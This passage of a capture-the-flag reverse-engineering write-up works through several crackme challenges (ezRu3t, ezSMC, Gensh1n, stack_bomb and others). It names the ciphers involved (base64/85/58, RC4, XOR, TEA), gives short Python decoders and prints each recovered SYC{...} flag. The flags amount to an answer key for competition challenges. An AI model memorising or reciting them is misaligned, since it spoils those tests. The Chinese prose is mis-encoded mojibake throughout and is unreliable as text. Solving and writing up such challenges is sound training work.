ror8(t, n)  <span class="comment"># gives k ^ in</span></span><br><span class="line">    inb = k ^ x</span><br><span class="line">    res.append(inb)</span><br><span class="line">flag = <span class="built_in">bytes</span>(res)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;asdjjasdhjk12wk12ijkejk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ezRu3t"><a href="#ezRu3t" class="headerlink" title="ezRu3t"></a>ezRu3t</h3><blockquote><p>4ak5ra: Samsaraæ€ä¹ˆè¿™ä¹ˆå(å°å£°)<br>QYQS:ä¸ºä»€ä¹ˆå‘¢?ï¼ˆä¸­å£°ï¼‰<br>K4per:Samsaraæ€ä¹ˆè¿™ä¹ˆå(è¶…å¤§å£°)<br>sleep4r: æˆ‘å¾—å­¦ä¹ ä¸€ä¸‹ï¼ˆæ€è€ƒï¼‰<br>Samsaraï¼šä½•æ„å‘³</p></blockquote><p>rustç¨‹åºï¼Œä¼ªç ä¸æ±‡ç¼–ç»“åˆçœ‹ã€‚</p><p>ä¸»å‡½æ•°sub_140002490ï¼Œå…ˆè¿›å…¥sub_140003020ï¼Œæ˜¯base64ç®—æ³•ï¼Œç è¡¨ä¸ºå¸¸è§„ç è¡¨A-Za-z0-9ï¼›å¾€ä¸‹å†åˆ°base85ç¼–ç ç®—æ³•ï¼Œç è¡¨åœ¨ <code>a0123456789Abcd</code>ï¼Œæå–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstu</span><br></pre></td></tr></table></figure><p>æœ€åæ˜¯ä¸€ä¸ªstrè½¬hexï¼Œç”¨memcmpæ¯”è¾ƒç»“æœä¸å¯†æ–‡ï¼Œåœ¨memcmpä¸‹æ–­ç‚¹ï¼ŒåŠ¨è°ƒæå–å¯†æ–‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3c41413b58414d3f2c5f403b545b7240374537373968383b733e276070743d3e336336415375484641534f74503c476b665f4134266750416c315d53</span><br></pre></td></tr></table></figure><p>Cyberchefè§£å¯†ï¼Œfromhex+base85+base64ï¼Œå¾—åˆ°flagï¼š</p><p><code>SYC&#123;Ohjhhh_y0u_g3t_Ezzzzz3_Ru3t!@&#125;</code></p><p>â€‹</p><h3 id="QYQSã®å¥‡å¦™å†’é™©"><a href="#QYQSã®å¥‡å¦™å†’é™©" class="headerlink" title="QYQSã®å¥‡å¦™å†’é™©"></a>QYQSã®å¥‡å¦™å†’é™©</h3><blockquote><p>QYQSç†¬å¤œæ‰“å®Œæ¯”èµ›,ä¸€ççœ¼å°±ç©¿è¶Šåˆ°äº†ä¸€ä¸ªåºŸåœŸä¸–ç•Œ,åœ¨ä¸‹æ°´ç®¡é“é‡Œ,ä»–æ¡åˆ°äº†ä¸€ä¸ªå¥‡å¦™çš„ç»ˆç«¯,å¯æ˜¯ä¸ºä»€ä¹ˆä»–ä¹Ÿå«QYQSå‘¢?<br>(ç©ºæ ¼è·³è¿‡æ—¶æ³¨æ„ä¸è¦æŒ‰å¤šäº†å“ŸQAQ)</p></blockquote><p>ç”¨æˆ·è¾“å…¥ä¸€ä¸ª 21 å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå¯¹è¾“å…¥åšåŠ å¯†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input[i] = input[i] ^ key[i % 4] ^ i</span><br></pre></td></tr></table></figure><p>å†å°†ç»“æœä¸ QYQS æ•°ç»„æ¯”è¾ƒã€‚</p><p>å¼‚æˆ–å¯é€†ï¼Œè¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b&quot;QYQS&quot;</span></span><br><span class="line">QYQS = [<span class="number">2</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">3</span>, <span class="number">23</span>, <span class="number">57</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">34</span>, <span class="number">41</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">109</span>, <span class="number">6</span>, <span class="number">32</span>, <span class="number">23</span>, <span class="number">127</span>, <span class="number">56</span>]</span><br><span class="line"></span><br><span class="line">input_bytes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(QYQS)):</span><br><span class="line">    val = QYQS[i] ^ key[i % <span class="number">4</span>] ^ i</span><br><span class="line">    input_bytes.append(val)</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">bytes</span>(input_bytes)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;I_@m_QyqS_r1GhT?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ezSMC"><a href="#ezSMC" class="headerlink" title="ezSMC"></a>ezSMC</h3><blockquote><p>å°æ•…äº‹:<br>è®°å¾—æˆ‘å»å¹´åšSMCçš„æ—¶å€™QYQSè¯´SMCæœ‰å¦™å¦™å·¥å…·ï¼Œæˆ‘å½“æ—¶ä¸€ç›´å¾ˆå¥½å¥‡æ˜¯ä»€ä¹ˆå·¥å…·æ²¡æ‰¾åˆ°ã€‚åé¢è¿›äº†Sycloverä»¥åä»–ç»ˆäºå‘Šè¯‰æˆ‘ï¼Œå¦™å¦™å·¥å…·æ˜¯VS2022â€¦â€¦</p></blockquote><p>ASCII â†’ Hex â†’ Bytesã€‚</p><p>encodeå‡½æ•°ï¼Œä½¿ç”¨RC4ç®—æ³•åŠ å¯†ï¼Œä½¿ç”¨ key=0x11ï¼›</p><p>miao_encryptå‡½æ•°ï¼Œå­˜åœ¨SMCï¼ŒåŠ¨è°ƒè¿˜åŸencodeeï¼Œæ˜¯ä¸€ä¸ªbase64ç®—æ³•ï¼Œç è¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br></pre></td></tr></table></figure><p>enc0deå‡½æ•°ï¼Œbase58ç®—æ³•ï¼Œç è¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789</span><br></pre></td></tr></table></figure><p>æå–å¯†æ–‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tHMoSoMX71sm62ARQ8aHF6i88nhkH9Ac2J7CrkQsQgXpiy6efoC8YVkzZu1tMyFxCLbbqvgXZHxtwK5TACVhPi1EE5mK6JG56wPNR4d2GmkELGfJHgtcAEH7</span><br></pre></td></tr></table></figure><p>Cyberchefè¿˜åŸï¼Œbase58+base64+RC4ï¼Œå¾—åˆ°flagï¼š</p><p><code>SYC&#123;OHhhhhhhh_y0u_Kn0m_SMCCCC@!&#125;</code></p><p>â€‹</p><h3 id="Gensh1n"><a href="#Gensh1n" class="headerlink" title="Gensh1n"></a>Gensh1n</h3><blockquote><p>sleep4r ï¼šä¸–ç•Œä¸Šæœ€å¥½çš„æ¸¸æˆæ˜¯ä»€ä¹ˆï¼Ÿ<br>4akraï¼šé‚£å¿…é¡»æ˜¯Gensh1n<br>Samsaraï¼šæ²¡æ•‘äº†çƒ§äº†å§</p></blockquote><p>ä¸»å‡½æ•° main() çš„æµç¨‹ï¼š</p><p>åˆå§‹åŒ– global_nodes æ•°ç»„ï¼ˆè°ƒç”¨ init_node()ï¼‰ï¼Œæç¤ºè¾“å…¥ 8 ä¸ªå­—ç¬¦ï¼Œæ£€æŸ¥æ¯ä¸ªå­—ç¬¦æ˜¯å¦åˆæ³•ï¼ˆis_valid_char()ï¼‰ï¼Œè°ƒç”¨ calc_string_hash() è®¡ç®—è¾“å…¥å­—ç¬¦ä¸²çš„å“ˆå¸Œï¼Œæ¯”è¾ƒè¾“å…¥å­—ç¬¦å’Œ global_nodes çš„æŸäº›å…ƒç´ ï¼Œå†³å®šæ˜¯å¦è¾“å‡ºæˆåŠŸæ¶ˆæ¯ã€‚</p><p>.fini_array æ‰§è¡Œ cleanup()ï¼Œè¾“å…¥å†…å®¹é€šè¿‡compute_checksumï¼Œå¾—åˆ°destï¼Œä¸resultæ¯”è¾ƒã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">compute_checksum</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">    v3 = __ROL4__(*(i + a1) + v3, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥å¿…é¡»28å­—èŠ‚ï¼Œç»è¿‡sub_44656(â€œgeek2025â€)å¤„ç†åï¼Œdestå¿…é¡»ç­‰äºresultï¼Œä¸”CRCåŒ¹é…ã€‚</p><p>sub_44656æ˜¯æ ‡å‡†RC4ï¼Œkey=geek2025ã€‚</p><p>æå–å¯†æ–‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result_hex=5259F38A000FE65636E5F033406E56815AE56F876F9F21C9A6BB1651</span><br></pre></td></tr></table></figure><p>è§£RC4ï¼Œflagï¼š</p><p><code>SYC&#123;50_y0u_pl@y_Gensh1n_too&#125;</code></p><p>â€‹</p><h3 id="QYQSã®å¥‡å¦™å†’é™©2"><a href="#QYQSã®å¥‡å¦™å†’é™©2" class="headerlink" title="QYQSã®å¥‡å¦™å†’é™©2"></a>QYQSã®å¥‡å¦™å†’é™©2</h3><blockquote><p>å½“ä½ å†æ¬¡æ‹¿èµ·ç»ˆç«¯æ—¶,å®ƒä¼¼ä¹å°‘äº†ä»€ä¹ˆ,åˆä¼¼ä¹å¤šäº†ä»€ä¹ˆ</p></blockquote><p>mainæ±‡ç¼–ååŠæ®µæ²¡æœ‰åæ±‡ç¼–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000000014001279B ; 77:     _initterm_0();</span><br><span class="line">.text:000000014001279B                 nop</span><br><span class="line">.text:000000014001279C                 call    cs:__imp__initterm_0</span><br><span class="line">.text:00000001400127A2                 nop</span><br><span class="line">.text:00000001400127A3                 xor     eax, eax</span><br><span class="line">.text:00000001400127A5                 jmp     loc_1400128F9</span><br></pre></td></tr></table></figure><p>è¿™æ®µnopæ‰ï¼Œå¾—åˆ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">v19 = <span class="number">114514</span>;</span><br><span class="line"><span class="keyword">for</span> ( n = <span class="number">0</span>; ; ++n )</span><br><span class="line">&#123;</span><br><span class="line">  v23 = n;</span><br><span class="line">  <span class="keyword">if</span> ( n &gt;= j_strlen(_ArgList) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v19 += QYQS[n];</span><br><span class="line">  v19 &lt;&lt;= key[n % <span class="number">4</span>];</span><br><span class="line">  _ArgList[n] ^= v19;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( ii = <span class="number">0</span>; ; ++ii )</span><br><span class="line">&#123;</span><br><span class="line">  v23 = ii;</span><br><span class="line">  <span class="keyword">if</span> ( ii &gt;= j_strlen(_ArgList) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( _ArgList[ii] != *(&amp;_security_cookie_0.value + ii) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">&#125;</span><br><span class="line">typeWriterEffect(<span class="string">&quot;éªŒè¯æˆåŠŸ\n&quot;</span>);</span><br><span class="line">j_GetConsoleScreenBufferInfo_0(<span class="string">&quot;\n&quot;</span>, v7);</span><br><span class="line">j_GetConsoleScreenBufferInfo_0(<span class="string">&quot;\næŒ‰ä»»æ„é”®é€€å‡º...&quot;</span>, v8);</span><br></pre></td></tr></table></figure><p>__security_cookie_0å°±æ˜¯flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c = [ <span class="number">83</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">89</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">67</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">123</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">64</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">121</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">95</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">98</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">95</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">121</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">117</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">95</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">49</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">110</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">100</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">63</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">125</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">4</span>):</span><br><span class="line">    m.append(c[i])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;M@y_bE_y0u_F1nd?&#125;\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="stack-bomb"><a href="#stack-bomb" class="headerlink" title="stack_bomb"></a>stack_bomb</h3><blockquote><p>ç¥è¯´:è¦æœ‰æ ˆ,äºæ˜¯QYQSå¼€è¾Ÿäº†ä¸€å¤§ç‰‡çš„æ ˆ<br>QYQSè¯´:å¾—çœ‹æ±‡ç¼–,äºæ˜¯reæ‰‹å¤±å»äº†ä»–ä»¬ä¿¡èµ–çš„ä¼ªä»£ç <br>(æœ¬é¢˜ç›®flagæ ¼å¼ä¸ºsyc{})</p></blockquote><p>ä¸»å‡½æ•°sub_2F1FE0ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:002F214D                 push    offset sub_2F1307</span><br><span class="line">.text:002F2152                 push    offset sub_2F109B</span><br><span class="line">.text:002F2157                 push    offset sub_2F13F2</span><br><span class="line">.text:002F215C                 push    offset sub_2F1186</span><br><span class="line">.text:002F2161                 push    offset sub_2F115E</span><br><span class="line">.text:002F2166                 push    offset sub_2F1091</span><br><span class="line">.text:002F216B                 push    offset sub_2F12D0</span><br><span class="line">.text:002F2170                 push    offset sub_2F1163</span><br><span class="line">.text:002F2175                 push    offset sub_2F1005</span><br><span class="line">.text:002F217A                 push    offset sub_2F139D</span><br><span class="line">.text:002F217F                 push    offset sub_2F1014</span><br></pre></td></tr></table></figure><p>åŒ…å«åŸºäºå‡½æ•°æŒ‡é’ˆçš„æ··æ·†ï¼Œåˆ†ææ ¸å¿ƒå˜æ¢å‡½æ•° sub_2F1920/sub_2F1014ã€‚</p><p>è¿›è¡Œå››æ¬¡è°ƒç”¨çš„â€œåŠ å¯†é€»è¾‘â€å°±æ˜¯å‡½æ•° sub_2F1920 (æˆ–å…¶è·³è½¬å…¥å£ sub_2F1014)ã€‚</p><p>è¿™ä¸ªå‡½æ•°æ¥æ”¶ä¸€ç»„æ•°æ®ï¼ˆå¯èƒ½æ˜¯ä¸€ä¸ª 64 ä½å€¼ï¼Œåˆ†è§£ä¸ºä¸¤ä¸ª 32 ä½ DWORDï¼‰ï¼Œå¹¶å¯¹å…¶è¿›è¡Œå¤šæ¬¡å¾ªç¯å˜æ¢ã€‚ç»“æ„ä¸ TEAåˆ†ç»„å¯†ç ç®—æ³•çš„æ ¸å¿ƒè½®å‡½æ•°éå¸¸ç›¸ä¼¼ã€‚</p><p>å…³é”®å‚æ•°ï¼š</p><p>arg_0: è¿™æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘éœ€è¦è¢«åŠ å¯†æˆ–è§£å¯†ï¼ˆå˜æ¢ï¼‰çš„ 64 ä½ï¼ˆ8 å­—èŠ‚ï¼‰æ•°æ®å—ã€‚åœ¨å‡½æ•°å†…éƒ¨è¢«æ‹†åˆ†ä¸º var_C (å·¦ 32 ä½) å’Œ var_18 (å³ 32 ä½)ã€‚</p><p>arg_0+4: å¦ä¸€ä¸ªæŒ‡é’ˆï¼Œå¯èƒ½æŒ‡å‘ç”¨äºå˜æ¢çš„å¯†é’¥ã€‚åœ¨å‡½æ•°å†…éƒ¨è¢«æ‹†åˆ†ä¸ºå››ä¸ª 32 ä½å€¼ï¼švar_3C, var_48, var_54, var_60ã€‚</p><p>arg_144: å˜æ¢çš„è½®æ•°ï¼ˆLoop Countï¼‰ï¼Œç”¨äºæ§åˆ¶å¾ªç¯æ‰§è¡Œçš„æ¬¡æ•°ã€‚</p><p>ä¸»è¦çš„å˜æ¢é€»è¾‘åœ¨ä¸€ä¸ªå¾ªç¯å†…æ‰§è¡Œï¼ˆä» loc_2F19C1 åˆ° loc_2F1B37ï¼‰ï¼Œå…¶ç»“æ„ä¸ºï¼š</p><p>$\begin{aligned} &amp;\text{sum} = 0 \quad (\text{var_24}) \ &amp;\text{loop (up to } \arg_C8 \text{ times):} \ &amp; \quad \quad \text{sum} = \text{Call}_{\text{arg_170}} (\text{sum}, \text{Delta}) \ &amp; \quad \quad \text{V1} = \text{V1} \oplus \text{Op}_1 (\text{V0}, \text{sum}) \ &amp; \quad \quad \text{V0} = \text{V0} \oplus \text{Op}_2 (\text{V1}, \text{sum}) \end{aligned}$</p><p>å…¶ä¸­ï¼š</p><p>V0 (var_C) å’Œ V1 (var_18) æ˜¯è¢«å˜æ¢çš„ 64 ä½æ•°æ®å—ï¼ˆè¢«åˆ†ä¸ºä¸¤ä¸ª 32 ä½å­—ï¼‰ã€‚</p><p>sum (var_24) æ˜¯ç´¯åŠ å˜é‡ï¼ˆé€šå¸¸æ˜¯ TEA/XTEA ä¸­çš„ $\text{sum}$ï¼‰ã€‚</p><p>Delta æ˜¯ä¸€ä¸ªå›ºå®šå¸¸é‡ï¼ˆé€šå¸¸ä¸ $\text{sum}$ ä¸€èµ·ä¼ å…¥ $\text{Call}_{\text{arg_170}}$ è¿›è¡Œç´¯åŠ ï¼‰ã€‚</p><p>åŠ¨è°ƒæ‰¾åˆ°sub_2F1920é‡Œé¢çš„var_24ï¼Œdelta=0x9000000ï¼Œè¿˜åŸTEAï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0x9000000</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0x9000000</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">key = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">encrypted = [<span class="number">0x9A8C0C4B</span>,<span class="number">0xC412FF1C</span>,<span class="number">0xBFC3A488</span>,<span class="number">0xB16C8FD0</span>,<span class="number">0x4136E319</span>,<span class="number">0x8835E4FF</span>,<span class="number">0x118263A7</span>,<span class="number">0x7C85D629</span>]</span><br><span class="line"></span><br><span class="line">decrypted = []</span><br><span class="line">final = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted)//<span class="number">2</span>):</span><br><span class="line">    now = decrypt(encrypted[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">    decrypted += now</span><br><span class="line">    final += long_to_bytes(now[<span class="number">0</span>])[::-<span class="number">1</span>] + long_to_bytes(now[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;syc&#123;QYQS_F1nD_Th3_@nswer_H3re~~&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ez-vm"><a href="#ez-vm" class="headerlink" title="ez_vm"></a>ez_vm</h3><blockquote><p>çœŸçš„æ˜¯vmå—ï¼Œå¥½åƒæ˜¯ï¼Œä½†å¥½åƒä¸æ˜¯ï¼Œç®¡ä»–çš„ï¼Œåæ­£foxèƒ½ç§’</p></blockquote><p>åˆ†æé€»è¾‘ï¼š</p><p><strong>main å‡½æ•°ï¼šæ•´ä½“æµç¨‹ä¸çŠ¶æ€æœº</strong></p><p>main å‡½æ•°æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ï¼Œå®ƒæ§åˆ¶ç€æ•´ä¸ªæ‰§è¡Œæµç¨‹ã€‚</p><p>VM åˆå§‹åŒ–ï¼š global_vm = vm_init(4096LL, 1024LL); ç¨‹åºé¦–å…ˆè°ƒç”¨ vm_init æ¥åˆå§‹åŒ–ä¸€ä¸ªå…¨å±€è™šæ‹Ÿæœºå®ä¾‹ã€‚è¿™ä¸ªVMåˆ†é…äº† 4096 å­—èŠ‚çš„ â€œä»£ç /æ•°æ®â€ å†…å­˜å’Œ 1024 å­—èŠ‚çš„ â€œæ ˆâ€ å†…å­˜ã€‚</p><p>ä¸»çŠ¶æ€æœºï¼š ç¨‹åºä½¿ç”¨å˜é‡ v6 å’Œ v7 æ¥æ„å»ºä¸€ä¸ªçŠ¶æ€æœºï¼Œé€šè¿‡ä¸€ä¸ª while(1) å¾ªç¯æ¥é©±åŠ¨ã€‚</p><p>çŠ¶æ€ 0 (v7 = 0)ï¼šåˆå§‹åŒ–çŠ¶æ€ï¼Œå°† v6 å’Œ v7 æ›´æ–°ä¸ºçŠ¶æ€ 1 çš„å€¼ã€‚</p><p>çŠ¶æ€ 1 (v7 = 1)ï¼šè°ƒç”¨ sub_1a2b3c(global_vm, &amp;sub_5c6d7e, 3LL, 29LL);ï¼Œç„¶åå°†çŠ¶æ€æ›´æ–°ä¸º 2ã€‚</p><p>çŠ¶æ€ 2 (v7 = 2)ï¼šè°ƒç”¨ sub_9e8f7a(global_vm);ï¼Œç„¶åå°†çŠ¶æ€æ›´æ–°ä¸º 3ã€‚</p><p>çŠ¶æ€ 3 (v7 = 3)ï¼šæ‰§è¡Œæœ€ç»ˆçš„ clock() æ£€æŸ¥ï¼Œç„¶å return 0; æ­£å¸¸é€€å‡ºã€‚</p><p>å…¶ä»–çŠ¶æ€ï¼šä»»ä½•æ„å¤–çš„çŠ¶æ€ï¼ˆv3 è®¡ç®—å‡ºéé¢„æœŸçš„å€¼ï¼‰éƒ½ä¼šå¯¼è‡´ exit(1)ã€‚</p><p><strong>sub_1a2b3c ä¸ string_process_program</strong></p><p>è¿™æ˜¯ç¨‹åºæµç¨‹çš„ç¬¬ä¸€éƒ¨åˆ†ï¼ˆåœ¨ main çš„çŠ¶æ€ 1 ä¸­è°ƒç”¨ï¼‰ã€‚</p><p>sub_1a2b3c é¦–å…ˆå°† .data åŒºçš„ _sub_5c6d7e å¤„çš„æ•°æ®ï¼ˆå…± 29 å­—èŠ‚ï¼‰å¤åˆ¶åˆ° VM çš„å†…å­˜ä¸­ï¼Œåç§»é‡ä¸º 256ï¼ˆvm_mem[256]ï¼‰çš„ä½ç½®ã€‚</p><p>ç„¶åï¼Œå®ƒè°ƒç”¨ vm_load_program 